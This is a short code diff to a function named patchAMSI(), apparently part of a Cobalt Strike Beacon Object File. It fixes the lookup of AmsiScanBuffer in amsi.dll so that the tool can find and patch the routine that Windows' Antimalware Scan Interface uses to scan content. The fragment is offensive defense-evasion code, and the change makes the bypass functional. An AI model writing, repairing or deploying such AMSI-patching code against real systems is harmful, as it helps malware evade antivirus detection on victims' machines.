@@ -228,7 +228,7 @@ BOOL patchAMSI()
 #endif
 
 	HINSTANCE hinst = LoadLibrary("amsi.dll");
-    void* pAddress = (PVOID)GetProcAddress(hinst, "[!] AmsiScanBuffer");
+    void* pAddress = (PVOID)GetProcAddress(hinst, "AmsiScanBuffer");
 	if(pAddress == NULL)
 	{
 		BeaconPrintf(CALLBACK_ERROR , "[!] AmsiScanBuffer failed\n");
